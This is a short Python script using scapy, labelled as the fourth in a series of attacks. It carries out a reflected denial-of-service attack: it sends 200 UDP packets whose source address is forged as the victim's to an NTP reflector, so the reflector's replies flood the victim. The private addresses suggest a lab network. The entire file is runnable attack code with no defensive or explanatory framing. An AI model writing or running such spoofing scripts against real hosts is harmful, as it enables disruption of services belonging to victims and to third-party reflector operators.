#!/usr/bin/env python3
# Attack 4: Reflected DDoS using UDP amplification
# Run from: internet
# Usage: python3 reflected_ddos.py

from scapy.all import *

REFLECTOR_IP = "10.12.0.30"  # ntp server acting as reflector
REFLECTOR_PORT = 12345

VICTIM_IP = "10.12.0.10"  # http server is the victim
COUNT = 200

def reflected_ddos():
    print(f"[*] Starting Reflected DDoS Attack")
    print(f"[*] Reflector: {REFLECTOR_IP}:{REFLECTOR_PORT}")
    print(f"[*] Victim: {VICTIM_IP}")
    print(f"[*] Sending {COUNT} spoofed requests...")
    print(f"[*] Reflector will send large replies to victim!")

    for i in range(COUNT):
        pkt = (
            IP(src=VICTIM_IP, dst=REFLECTOR_IP) /
            UDP(sport=RandShort(), dport=REFLECTOR_PORT) /
            Raw(load="GET")  # small request
        )
        send(pkt, verbose=0)
        if i % 20 == 0:
            print(f"  [+] Sent {i}/{COUNT} spoofed requests")

    print(f"[+] Attack complete!")

if __name__ == "__main__":
    reflected_ddos()
